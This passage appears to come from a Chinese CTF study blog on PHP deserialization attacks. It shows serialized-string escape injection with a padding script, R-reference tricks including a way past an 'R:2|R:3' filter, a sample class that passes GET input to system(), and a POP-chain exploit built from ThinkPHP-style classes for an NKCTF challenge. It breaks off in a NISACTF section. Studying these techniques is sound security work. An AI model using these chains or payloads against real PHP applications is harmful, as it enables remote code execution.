class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;sign&#x27;</span>] = <span class="hljs-string">&#x27;hello&#x27;</span>; <br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;number&#x27;</span>] = <span class="hljs-string">&#x27;2020&#x27;</span>;<br><span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">str_rep</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-variable">$fake</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#a:3:&#123;s:4:&quot;name&quot;;s:6:&quot;whoami&quot;;s:4:&quot;sign&quot;;s:5:&quot;hello&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>字符逃逸利用方法：</p><p>比如将<code>number</code>的值换成<code>hacker</code></p><p>先构造number的值为hacker的序列化字符串<code>s:6:&quot;number&quot;;s:6:&quot;hacker&quot;</code></p><p>后面加上闭合<code>;s:6:&quot;number&quot;;s:6:&quot;hacker&quot;;&#125;</code>,</p><p>先把number的值填为上面的字符串进行序列化</p><p>计算序列化后前一个变量的值第二个引号开始到要修改的变量的值的第一个引号前的长度20</p><p>每次替换会少4个字符，所以需要填充20/4=5个test</p><p>将5个test填到<strong>前一个相邻</strong>的变量上</p><p>再序列化变为<code>a:3:&#123;s:4:&quot;name&quot;;s:6:&quot;whoami&quot;;s:4:&quot;sign&quot;;s:20:&quot;&quot;;s:6:&quot;number&quot;;s:28:&quot;;s:6:&quot;number&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;&#125;</code></p><p>再写个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var_name</span>=<span class="hljs-string">&#x27;number&#x27;</span>; <span class="hljs-comment">#输入要修改的变量名</span><br><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;hacker&#x27;</span>; <span class="hljs-comment">#输入要修改为的值</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$var_name</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$var_name</span>.<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$replaced_value</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$replace_value</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$rep_len</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$var_name</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$var_name</span>.<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;:&#x27;</span>);<br><span class="hljs-variable">$rep_str</span>=<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-variable">$replaced_value</span>,<span class="hljs-variable">$rep_len</span>/(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$replaced_value</span>)-<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$replace_value</span>)));<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$rep_str</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="引用反序列化"><a class="markdownIt-Anchor" href="#引用反序列化"></a> 引用反序列化</h3><h4 id="php序列化中的r与r"><a class="markdownIt-Anchor" href="#php序列化中的r与r"></a> PHP序列化中的R与r</h4><ul><li>序列化中的R表示对另一个对象的引用</li><li>序列化中的r表示对和自身对象相同的对象进行引用</li></ul><p>R后面的数字表示所引用的对象在序列化串中第一次出现的位置，例子如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Clazz</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;b;<br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Clazz&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p>clazz的编号是1，a的编号是2，所以b是对a的引用</p><p><a href="https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/">https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/</a></p><p><a href="https://eastjun.top/posts/php_unserialize_tricks/">https://eastjun.top/posts/php_unserialize_tricks/</a></p><h4 id="绕过对r后数字的限制"><a class="markdownIt-Anchor" href="#绕过对r后数字的限制"></a> 绕过对R后数字的限制</h4><p>有时候会过滤序列化字符串中R后面的数字，比如不让用R:2,R:3之类的，只需要在前面加一个对象改到R:4,R:5…就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b-&gt;<span class="hljs-title function_ invoke__">love</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable language_">$this</span>-&gt;c-&gt;name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c = <span class="hljs-string">&quot;no!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xk</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">love</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// if(preg_match(&#x27;/R:2|R:3/&#x27;,$_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="hljs-comment">//     die(&quot;no&quot;);</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// unserialize($_GET[&#x27;pop&#x27;]);</span><br><br><span class="hljs-variable">$x</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xk</span>();<br><span class="hljs-variable">$A</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-variable">$B</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">b</span>();<br><span class="hljs-variable">$B</span>-&gt;c= &amp;<span class="hljs-variable">$B</span>-&gt;b;<br><span class="hljs-variable">$B</span>-&gt;a=<span class="hljs-variable">$A</span>;<br><span class="hljs-variable">$A</span>-&gt;b=<span class="hljs-variable">$x</span>;<br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$B</span>));<br><br><span class="hljs-comment">// O:1:&quot;b&quot;:5:&#123;s:1:&quot;d&quot;;i:1;s:1:&quot;e&quot;;i:2;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;R:4;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="多文件反序列化利用"><a class="markdownIt-Anchor" href="#多文件反序列化利用"></a> 多文件反序列化利用</h3><p>在项目中类往往不会只写在一个文件里面，而且输入也不会说和这些类在一个文件，因此反序列化漏洞往往不会只是一个文件就能够完成构造，而是需要用到多个文件，多个类，那么如何从拥有几百甚至几千个文件的项目中快速挖掘出反序列化的pop链呢？首先要了解几个概念。</p><h4 id="基础-2"><a class="markdownIt-Anchor" href="#基础-2"></a> 基础</h4><h5 id="命名空间"><a class="markdownIt-Anchor" href="#命名空间"></a> 命名空间</h5><p><a href="https://www.php.net/manual/zh/language.namespaces.rationale.php">https://www.php.net/manual/zh/language.namespaces.rationale.php</a></p><blockquote><p>什么是命名空间？从广义上来说，命名空间是一种封装事物的方法。在很多地方都可以见到这种抽象概念。例如，在操作系统中目录用来将相关文件分组，对于目录中的文件来说，它就扮演了命名空间的角色。具体举个例子，文件 <code>foo.txt</code> 可以同时在目录 <code>/home/greg</code> 和 <code>/home/other</code> 中存在，但在同一个目录中不能存在两个 <code>foo.txt</code> 文件。另外，在目录 <code>/home/greg</code> 外访问 <code>foo.txt</code> 文件时，我们必须将目录名以及目录分隔符放在文件名之前得到 <code>/home/greg/foo.txt</code>。这个原理应用到程序设计领域就是命名空间的概念。</p></blockquote><blockquote><p>在 PHP 中，命名空间用来解决在编写类库或应用程序时创建可重用的代码如类或函数时碰到的两类问题：</p><ol><li>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</li><li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li></ol></blockquote><p>命名空间名称大小写不敏感。</p><p>名为 <code>PHP</code> 的命名空间，以及以这些名字开头的命名空间 （例如 <code>PHP\Classes</code>）被保留用作语言内核使用， 而不应该在用户空间的代码中使用。</p><p>命名空间通过关键字 <code>namespace</code> 来声明。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyProject</span>;<br><br>...<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="子命名空间"><a class="markdownIt-Anchor" href="#子命名空间"></a> 子命名空间</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyProject</span>\<span class="hljs-title class_">Sub</span>\<span class="hljs-title class_">Level</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="一个文件定义多个命名空间"><a class="markdownIt-Anchor" href="#一个文件定义多个命名空间"></a> 一个文件定义多个命名空间</h5><p>直接写，不同命名空间下可以用相同的类名、函数名等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyProject</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONNECT_OK</span> = <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* ... */</span>  &#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">AnotherProject</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONNECT_OK</span> = <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* ... */</span>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以用大括号语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyProject</span> &#123;<br><br><span class="hljs-title class_">const</span> <span class="hljs-title class_">CONNECT_OK</span> = 1;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* ... */</span>  &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">AnotherProject</span> &#123;<br><br><span class="hljs-title class_">const</span> <span class="hljs-title class_">CONNECT_OK</span> = 1;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* ... */</span>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="命名空间的使用"><a class="markdownIt-Anchor" href="#命名空间的使用"></a> 命名空间的使用</h5><ul><li>非限定名称</li></ul><p>类比相对文件名形式，例如 <code>$a=new foo();</code> 或 <code>foo::staticmethod();</code>。如果当前命名空间是 <code>currentnamespace</code>，foo 将被解析为 <code>currentnamespace\foo</code>。</p><ul><li>限定名称</li></ul><p>类比相对路径名形式，例如 <code>$a = new subnamespace\foo();</code> 或 <code>subnamespace\foo::staticmethod();</code>。如果当前的命名空间是 <code>currentnamespace</code>，则 foo 会被解析为 <code>currentnamespace\subnamespace\foo</code>。</p><ul><li>完全限定名称</li></ul><p>类比绝对路径名形式， <code>$a = new \currentnamespace\foo();</code> 或 <code>\currentnamespace\foo::staticmethod();</code>。</p><h5 id="命名空间别名声明"><a class="markdownIt-Anchor" href="#命名空间别名声明"></a> 命名空间别名声明</h5><p>别名是通过操作符 <code>use</code> 来实现的，通常是为了创建一个别名（或简短）的名称，提高源代码的可读性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">My</span>\<span class="hljs-title">Full</span>\<span class="hljs-title">NSname</span>; <span class="hljs-comment">//与use My\Full\NSname as NSname相同</span><br></code></pre></td></tr></table></figure><h4 id="链子挖掘"><a class="markdownIt-Anchor" href="#链子挖掘"></a> 链子挖掘</h4><p>既然是反序列化漏洞，那就肯定先找<code>unserialize</code>函数，通过全局搜过就可以（能够漏洞利用首先需要unserialize的参数可控）</p><p>接着找反序列入口<code>__destruct</code>，接下来就根据<code>__destruct</code>中能够触发的魔法函数找下个类，比如能出发<code>__call</code>，那就直接全局搜索<code>__call</code>，找到对应的类，以此类推，知道找到能利用的点。</p><h5 id="例子nkctf-2024-用过就是熟悉"><a class="markdownIt-Anchor" href="#例子nkctf-2024-用过就是熟悉"></a> 例子：NKCTF 2024 用过就是熟悉</h5><p>只讲链子构造部分</p><p>搜索unserialize,找到反序列化入口，而且参数可控</p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg" class=""><p>搜索<code>__destruct</code>，有多个，一个一个看，里面有函数可以跟进去，一般是要找那种<code>$this-&gt;属性-&gt;调用</code>的形式，这样把他的属性赋值成其他类就可以链起来</p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.jpg" class=""><p>跟进removeFiles，$this-&gt;files当成字符串拼接，可以触发toString,搜素toString</p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" class=""><p>跟进<code>$this-&gt;toJson</code>,跟进<code>$this-&gt;toArray()</code></p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.jpg" class=""><p>访问一个不存在的属性就会调用<code>__get</code>,全局搜索<code>__get</code>，</p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.jpg" class=""><p>调用不存在的方法可以触发<code>__call</code>,全局搜索<code>__call</code></p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.jpg" class=""><p>这样就找到了利用点，把刚才用到的类都写出来(命名空间根据项目里面写的照抄就行)，然后根据条件赋值</p><p>链子就是<code>Windows-&gt;Collection-&gt;View-&gt;Testone</code>，<font color="red">抽象类要调用他的实现类</font>，exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Process</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> \think\<span class="hljs-title function_ invoke__">Collection</span>());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">ArrayAccess</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">ArrayIterator</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Countable</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">IteratorAggregate</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">JsonSerializable</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Collection</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$items</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;items=<span class="hljs-keyword">new</span> \think\<span class="hljs-title function_ invoke__">View</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">View</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$engine</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Loginout&quot;</span>=&gt;<span class="hljs-keyword">new</span> \think\Debug);<br>        <span class="hljs-variable language_">$this</span>-&gt;engine=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;time&quot;</span>=&gt;<span class="hljs-string">&quot;10086&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">exception</span>\<span class="hljs-title">ClassNotFoundException</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">response</span>\<span class="hljs-title">Redirect</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Debug</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Testone</span></span><br><span class="hljs-class"></span>&#123;<br>&#125;<br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testone</span></span><br><span class="hljs-class"></span>&#123;<br><br>&#125;<br><br><br><span class="hljs-comment">// use think\process\pipes\Windows;</span><br><span class="hljs-variable">$w</span>=<span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>();<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="nisactf-2022babyserialize"><a class="markdownIt-Anchor" href="#nisactf-2022babyserialize"></a> [NISACTF 2022]babyserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 